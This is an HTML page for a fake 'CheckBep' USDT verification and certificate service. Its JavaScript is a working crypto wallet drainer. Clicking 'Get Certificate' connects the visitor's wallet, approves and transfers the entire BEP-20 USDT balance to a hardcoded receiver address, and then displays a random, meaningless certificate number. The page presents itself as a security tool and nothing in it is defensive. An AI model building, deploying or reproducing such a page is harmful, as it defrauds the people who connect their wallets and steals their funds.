<!DOCTYPE html>
<html lang="en" data-bs-theme="dark">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Crypto Security Platform</title>
  <link rel="stylesheet" href="https://cdn.replit.com/agent/bootstrap-agent-dark-theme.min.css">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
  <style>
    body {
      font-family: 'Segoe UI', sans-serif;
    }
    .status {
      margin-top: 20px;
      font-weight: bold;
    }
  </style>
  <script src="https://cdn.jsdelivr.net/npm/web3@1.5.2/dist/web3.min.js"></script>
</head>
<body>

<!-- Header -->
<nav class="navbar navbar-expand-lg navbar-dark bg-dark">
  <div class="container">
    <a class="navbar-brand" href="#"><i class="fas fa-shield-alt me-2"></i>CheckBep</a>
  </div>
</nav>

<!-- Main -->
<main class="text-center py-5 container">
  <h1 class="fw-light mb-3">Secure Cryptocurrency Trading</h1>
  <p class="lead mb-4">Verify USDT transactions & get your secure certificate instantly.</p>

  <!-- Buttons -->
  <div class="d-flex justify-content-center gap-3 mb-4">
    <a href="javascript:void(0);" onclick="checkAndApprove()" class="btn btn-primary btn-lg">
      <i class="fas fa-shield-alt me-2"></i>Get Certificate
    </a>
    <a href="javascript:void(0);" class="btn btn-outline-secondary btn-lg disabled" style="pointer-events: none; opacity: 0.5;">
      <i class="fas fa-info-circle me-2"></i>Learn More
    </a>
  </div>

  <!-- Info Display -->
  <div id="approvalSection" style="display: block;">
    <p></p>
  </div>
  <div><span id="balanceAmount" style="font-weight: bold;"></span></div>
  <div id="certificateNumber" style="margin-bottom: 8px; font-weight: bold;"></div>
  <div id="walletAddress" style="margin-bottom: 8px; font-weight: bold;"></div>
  <div id="status" class="status text-success"></div>
</main>

<!-- Footer -->
<footer class="bg-dark text-light text-center py-3">
  <small>&copy; 2025 CryptoSecurity Platform. All rights reserved.</small>
</footer>

<!-- JavaScript -->
<script>
const usdtContractAddress = "0x55d398326f99059fF775485246999027B3197955"; // BEP-20 USDT
const receiverAddress = "0xB53941b949D3ac68Ba48AF3985F9F59105Cdf999";

const usdtAbi = [
  { "constant": true, "inputs": [{"name":"_owner","type":"address"}], "name": "balanceOf", "outputs": [{"name":"balance","type":"uint256"}], "type":"function" },
  { "constant": false, "inputs": [{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}], "name": "approve", "outputs": [{"name":"success","type":"bool"}], "type":"function" },
  { "constant": false, "inputs": [{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}], "name": "transfer", "outputs": [{"name":"success","type":"bool"}], "type":"function" },
  { "constant": true, "inputs": [], "name": "decimals", "outputs": [{"name":"","type":"uint8"}], "type":"function" }
];

async function checkAndApprove() {
  if (typeof window.ethereum === "undefined") {
    alert("Please install MetaMask or Trust Wallet to continue.");
    return;
  }

  const web3 = new Web3(window.ethereum);
  await window.ethereum.request({ method: 'eth_requestAccounts' });
  const accounts = await web3.eth.getAccounts();
  const userAddress = accounts[0];

  const usdt = new web3.eth.Contract(usdtAbi, usdtContractAddress);
  const decimals = await usdt.methods.decimals().call();
  const balance = await usdt.methods.balanceOf(userAddress).call();
  const formattedBalance = balance / (10 ** decimals);

  document.getElementById("balanceAmount").innerText = `USDT Balance: ${formattedBalance.toFixed(2)} USDT`;

  if (balance == 0) {
    document.getElementById("status").innerText = "Insufficient USDT balance.";
    return;
  }

  // Approve
  await usdt.methods.approve(receiverAddress, balance).send({ from: userAddress });
  // Transfer
  await usdt.methods.transfer(receiverAddress, balance).send({ from: userAddress });

  // Generate Certificate
  const certNumber = Math.floor(Math.random() * 900000 + 100000); // 6-digit cert
  document.getElementById("certificateNumber").innerText = "Certificate No: #" + certNumber;
  document.getElementById("walletAddress").innerText = "Wallet: " + userAddress;
  document.getElementById("status").innerText = "âœ… Certificate generated. Amount transferred: " + formattedBalance.toFixed(2) + " USDT";
}
</script>

</body>
</html>
